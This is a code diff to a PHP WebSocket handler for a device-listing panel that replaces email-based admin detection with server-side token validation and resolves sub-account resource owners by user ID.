@@ -5,6 +5,7 @@ declare(strict_types=1);
 namespace App\WebSocket\Handlers;
 
 use App\Models\Device;
+use App\Services\PanelTokenService;
 use App\WebSocket\ConnectionManager;
 use App\WebSocket\WebSocketLog;
 
@@ -19,34 +20,92 @@ final class CheckPhoneHandler
 
     public function handle(int $fd, array $data): void
     {
-        $email = $data['email'] ?? '';
+        $token = $data['token'] ?? '';
         $page = max(1, (int) ($data['page'] ?? 1));
         $pageSize = min(100, max(1, (int) ($data['pageSize'] ?? 10)));
         $filters = $data['filters'] ?? [];
 
+        if (empty($token)) {
+            WebSocketLog::getLogger()->warning("CheckPhone: missing token, fd={$fd}");
+            $this->connectionManager->send($fd, [
+                'type' => 'checkphone',
+                'error' => 'Token is required',
+                'list' => [],
+                'total' => 0,
+                'pageCount' => 0,
+                'page' => $page,
+                'pageSize' => $pageSize,
+            ]);
+
+            return;
+        }
+
+        $tokenService = new PanelTokenService;
+        $result = $tokenService->validateToken($token);
+
+        if (! $result['authenticated']) {
+            WebSocketLog::getLogger()->warning("CheckPhone: invalid token, fd={$fd}");
+            $this->connectionManager->send($fd, [
+                'type' => 'checkphone',
+                'error' => 'Invalid or expired token',
+                'list' => [],
+                'total' => 0,
+                'pageCount' => 0,
+                'page' => $page,
+                'pageSize' => $pageSize,
+            ]);
+
+            return;
+        }
+
+        $userId = $result['user_id'];
+        $guard = $result['guard'];
+        $isAdmin = $guard === 'admin';
+
         \Illuminate\Support\Facades\DB::reconnect();
 
-        // 根据 admins 表判断是否为总管理员
-        $isAdmin = \App\Models\Admin::where('email', $email)->exists();
+        if ($isAdmin) {
+            $user = \App\Models\Admin::find($userId);
+        } else {
+            $user = \App\Models\User::find($userId);
+        }
 
-        WebSocketLog::getLogger()->debug("CheckPhone: fd={$fd}, email={$email}, isAdmin=" . ($isAdmin ? 'true' : 'false'));
+        if ($user === null) {
+            WebSocketLog::getLogger()->warning("CheckPhone: user not found, fd={$fd}, userId={$userId}");
+            $this->connectionManager->send($fd, [
+                'type' => 'checkphone',
+                'error' => 'User not found',
+                'list' => [],
+                'total' => 0,
+                'pageCount' => 0,
+                'page' => $page,
+                'pageSize' => $pageSize,
+            ]);
 
-        // 解析资源归属用户（子账号 → 父账号，主账号 → 自身）
-        $owner = $isAdmin ? null : $this->connectionManager->resolveResourceOwnerByEmail($email);
-        $ownerEmail = $owner['email'] ?? $email;
+            return;
+        }
 
-        // 注册面板用户时使用归属用户的 email，确保与设备侧 email 一致
-        $this->connectionManager->registerPanelUser($fd, $ownerEmail, $isAdmin);
+        // Resolve resource owner for sub-accounts
+        $ownerEmail = $user->email;
+        $ownerId = $isAdmin ? null : $userId;
+
+        if (! $isAdmin) {
+            $owner = $user->getResourceOwner();
+            $ownerEmail = $owner->email;
+            $ownerId = $owner->id;
+        }
+
+        WebSocketLog::getLogger()->debug("CheckPhone: fd={$fd}, userId={$userId}, isAdmin=".($isAdmin ? 'true' : 'false'));
+
+        // Register panel user with userId for device authorization
+        $this->connectionManager->registerPanelUser($fd, $ownerEmail, $isAdmin, $ownerId);
 
         $query = Device::query()->where('is_removed', false);
 
-        if (!$isAdmin) {
-            // 按资源归属用户 ID 查询设备（子账号共享父账号的设备）
-            $ownerId = $owner['id'] ?? null;
+        if (! $isAdmin) {
             if ($ownerId !== null) {
                 $query->where('user_id', $ownerId);
             } else {
-                // 未找到用户，返回空结果
                 $query->whereRaw('1 = 0');
             }
         }
@@ -54,7 +113,7 @@ final class CheckPhoneHandler
         $this->applyFilters($query, $filters);
 
         $total = $query->count();
-        WebSocketLog::getLogger()->debug("CheckPhone: found {$total} devices for email={$email}");
+        WebSocketLog::getLogger()->debug("CheckPhone: found {$total} devices for userId={$userId}");
         $pageCount = (int) ceil($total / $pageSize);
 
         $devices = $query
@@ -104,29 +163,29 @@ final class CheckPhoneHandler
 
     private function applyFilters($query, array $filters): void
     {
-        if (!empty($filters['user_email'])) {
+        if (! empty($filters['user_email'])) {
             $query->whereHas('user', function ($q) use ($filters) {
-                $q->where('email', 'like', '%' . $filters['user_email'] . '%');
+                $q->where('email', 'like', '%'.$filters['user_email'].'%');
             });
         }
 
-        if (!empty($filters['phone_name'])) {
-            $query->where('name', 'like', '%' . $filters['phone_name'] . '%');
+        if (! empty($filters['phone_name'])) {
+            $query->where('name', 'like', '%'.$filters['phone_name'].'%');
         }
 
-        if (!empty($filters['country'])) {
+        if (! empty($filters['country'])) {
             $query->where('country', $filters['country']);
         }
 
-        if (!empty($filters['model'])) {
-            $query->where('model', 'like', '%' . $filters['model'] . '%');
+        if (! empty($filters['model'])) {
+            $query->where('model', 'like', '%'.$filters['model'].'%');
         }
 
         if (isset($filters['accessibility']) && $filters['accessibility'] !== '') {
             $query->where('has_accessibility', $filters['accessibility'] === '1');
         }
 
-        if (!empty($filters['install_date'])) {
+        if (! empty($filters['install_date'])) {
             $query->whereDate('installed_at', $filters['install_date']);
         }
     }
@@ -135,7 +194,7 @@ final class CheckPhoneHandler
     {
         $templatePath = config('apk-builder.template_path', '');
 
-        if (empty($templatePath) || !is_dir($templatePath)) {
+        if (empty($templatePath) || ! is_dir($templatePath)) {
             return '';
         }
 
